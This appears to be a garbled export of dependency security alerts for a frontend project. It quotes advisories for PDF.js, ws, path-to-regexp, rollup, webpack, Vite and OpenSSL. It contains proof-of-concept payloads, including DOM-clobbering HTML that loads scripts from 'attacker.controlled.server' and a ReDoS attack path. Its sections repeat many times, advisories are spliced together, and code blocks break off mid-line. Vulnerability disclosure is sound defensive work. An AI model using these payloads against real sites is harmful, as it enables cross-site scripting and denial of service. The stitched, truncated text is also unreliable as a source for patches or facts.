1,apply-frontend,464322508,acme-inc-Education,CVE-2024-4367,github,8.8,PDF.js vulnerable to arbitrary JavaScript execution upon opening a malicious PDF,"### Impact
If pdf.js is used to load a malicious PDF, and PDF.js is configured with `isEvalSupported` set to `true` (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.

### Patches
The patch removes the use of `eval`:
https://github.com/mozilla/pdf.js/pull/18015

### Workarounds
Set the option `isEvalSupported` to `false`.

2,apply-frontend,464322508,acme-inc-Education,CVE-2024-34342,github,7.1,react-pdf vulnerable to arbitrary JavaScript execution upon opening a malicious PDF with PDF.js,"### Summary

If PDF.js is used to load a malicious PDF, and PDF.js is configured with `isEvalSupported` set to `true` (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.

### Patches
[This patch](https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad) forces `isEvalSupported` to `false`, removing the attack vector.

### Workarounds
Set `options.isEvalSupported` to `false`, where `options` is `Document` component prop.

A request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = ""!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~"".split('');

    headers: headers,
    host: '127.0.0.1',

  });

  request.end();

```

### Patches

The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Patches

The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

A request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

### Patches

The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Patches

The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

A request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = ""!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~"".split('');
  const headers = {};
  let count = 0;

There are two separate code paths in which memory can be allocated per message in excess of the `grpc.max_receive_message_length` channel option:

 1. If an incoming message has a size on the wire greater than the configured limit, the entire message is buffered before it is discarded.
 2. If an incoming message has a size within the limit on the wire but decompresses to a size greater than the limit, the entire message is decompressed into memory, and on the server is not discarded.

body-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.

A bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.

### Patches

For users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.

These versions add backtrack protection when a custom regex pattern is not provided:

- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)
- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)
- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)
- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)

They do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.

Version [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.

Version [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.

### Workarounds

All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.

If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.

### Details

Using `/:a-:b` will produce the regular expression `/^\/([^\/]+?)-([^\/]+?)\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.

Because JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.

We discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.

It's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.

### Details

#### Backgrounds

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/

#### Gadget found in `rollup`

We have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.

https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162

https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.

```
var s = document.createElement('script')
s.src = import.meta.url + 'extra.js'
document.head.append(s)
```

The output `bundle.js` is shown in the following code snippet.

```
'use strict';

var _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;
var s = document.createElement('script');
s.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';
document.head.append(s);
```

Adding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>rollup Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name=""currentScript"" src=""https://attacker.controlled.server/""></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script type=""module"" crossorigin src=""bundle.js""></script>
<body>
</body>
</html>
```

### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.

### Patch

Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.

```
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =>
	getResolveUrl(
		`'${escapeId(relativePath)}', ${
			umd ? `typeof document === 'undefined' ? location.href : ` : ''
		}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`
	);
```

```
const getUrlFromDocument = (chunkId: string, umd = false) =>
	`${
		umd ? `typeof document === 'undefined' ? location.href : ` : ''
	}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/

#### Gadget found in `rollup`

We have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.

https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162

https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.

```
var s = document.createElement('script')
s.src = import.meta.url + 'extra.js'
document.head.append(s)
```

The output `bundle.js` is shown in the following code snippet.

```
'use strict';

var _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;
var s = document.createElement('script');
s.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';
document.head.append(s);
```

Adding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>rollup Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name=""currentScript"" src=""https://attacker.controlled.server/""></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script type=""module"" crossorigin src=""bundle.js""></script>
<body>
</body>
</html>
```

### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.

### Patch

Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.

```
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =>
	getResolveUrl(
		`'${escapeId(relativePath)}', ${
			umd ? `typeof document === 'undefined' ? location.href : ` : ''
		}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`
	);
```

```
const getUrlFromDocument = (chunkId: string, umd = false) =>
	`${
		umd ? `typeof document === 'undefined' ? location.href : ` : ''
	}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(
		chunkId
	)}', document.baseURI).href)`;
```

We discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.

We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.


### Details

#### Backgrounds

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code.

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/


#### Gadgets found in Webpack

We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:

```
/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() => {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript)
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName(""script"");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser"");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/"");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
```

However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.

### PoC

Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.

Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:

```
// entry.js
import('./import1.js')
  .then(module => {
    module.hello();
  })
  .catch(err => {
    console.error('Failed to load module', err);
  });
```

```
// import1.js
export function hello () {
  console.log('Hello');
}
```

The webpack.config.js is set up as follows:
```
const path = require('path');

module.exports = {
  entry: './entry.js', // Ensure the correct path to your entry file
  output: {
    filename: 'webpack-gadgets.bundle.js', // Output bundle file
    path: path.resolve(__dirname, 'dist'), // Output directory
    publicPath: ""auto"", // Or leave this field not set
  },
  target: 'web',
  mode: 'development',
};
```

When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>Webpack Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name=""currentScript"" src=""https://attacker.controlled.server/""></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script src=""./dist/webpack-gadgets.bundle.js""></script>
<body>
</body>
</html>
```

### Impact

This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.

### Patch

A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174

```
/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() => {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :>
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName(""script"");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic.

/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/"");
/******/ 		__webpack_require__.p = scriptUrl;

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/


#### Gadgets found in Webpack

We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:

```
/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() => {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript)
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName(""script"");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser"");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/"");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
```

However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.

### PoC

Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.

Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:

```
// entry.js
import('./import1.js')
  .then(module => {
    module.hello();
  })
  .catch(err => {
    console.error('Failed to load module', err);
  });
```

```
// import1.js
export function hello () {
  console.log('Hello');
}
```

The webpack.config.js is set up as follows:
```
const path = require('path');

module.exports = {
  entry: './entry.js', // Ensure the correct path to your entry file
  output: {
    filename: 'webpack-gadgets.bundle.js', // Output bundle file
    path: path.resolve(__dirname, 'dist'), // Output directory
    publicPath: ""auto"", // Or leave this field not set
  },
  target: 'web',
  mode: 'development',
};
```

When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>Webpack Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name=""currentScript"" src=""https://attacker.controlled.server/""></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script src=""./dist/webpack-gadgets.bundle.js""></script>
<body>
</body>
</html>
```

### Impact

This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.

### Patch

A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174

```

/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :>
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName(""script"");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;

Impact summary: A buffer overread can have a range of potential consequences such as unexpected application beahviour or a crash. In particular this issue could result in up to 255 bytes of arbitrary private data from memory being sent to the peer leading to a loss of confidentiality. However, only applications that directly call the SSL_select_next_proto function with a 0 length list of supported client protocols are affected by this issue. This would normally never be a valid scenario and is typically not under attacker control but may occur by accident in the case of a configuration or programming error in the calling application.  The OpenSSL API function SSL_select_next_proto is typically used by TLS applications that support ALPN (Application Layer Protocol Negotiation) or NPN (Next Protocol Negotiation). NPN is older, was never standardised and is deprecated in favour of ALPN. We believe that ALPN is significantly more widely deployed than NPN. The SSL_select_next_proto function accepts a list of protocols from the server and a list of protocols from the client and returns the first protocol that appears in the server list that also appears in the client list. In the case of no overlap between the two lists it returns the first item in the client list. In either case it will signal whether an overlap between the two lists was found. In the case where SSL_select_next_proto is called with a zero length client list it fails to notice this condition and returns the memory immediately following the client list pointer (and reports that there was no overlap in the lists).  This function is typically called from a server side application callback for ALPN or a client side application callback for NPN. In the case of ALPN the list of protocols supplied by the client is guaranteed by libssl to never be zero in length. The list of server protocols comes from the application and should never normally be expected to be of zero length. In this case if the SSL_select_next_proto function has been called as expected (with the list supplied by the client passed in the client/client_len parameters), then the application will not be vulnerable to this issue. If the application has accidentally been configured with a zero length server list, and has accidentally passed that zero length server list in the client/client_len parameters, and has additionally failed to correctly handle a ""no overlap"" response (which would normally result in a handshake failure in ALPN) then it will be vulnerable to this problem.  In the case of NPN, the protocol permits the client to opportunistically select a protocol when there is no overlap. OpenSSL returns the first client protocol in the no overlap case in support of this. The list of client protocols comes from the application and should never normally be expected to be of zero length. However if the SSL_select_next_proto function is accidentally called with a client_len of 0 then an invalid memory pointer will be returned instead. If the application uses this output as the opportunistic protocol then the loss of confidentiality will occur.  This issue has been assessed as Low severity because applications are most likely to be vulnerable if they are using NPN instead of ALPN - but NPN is not widely used. It also requires an application configuration or programming error. Finally, this issue would not typically be under attacker control making active exploitation unlikely.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.  Due to the low severity of this issue we are not issuing new releases of OpenSSL at this time. The fix will be included in the next releases when they become available.","Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an empty supported client protocols buffer may cause a crash or memory contents to be sent to the peer.

We discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.

Note that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986

### Details

**Backgrounds**

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/

**Gadgets found in Vite**

We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

```
const relativeUrlMechanisms = {
  amd: (relativePath) => {
    if (relativePath[0] !== ""."") relativePath = ""./"" + relativePath;
    return getResolveUrl(
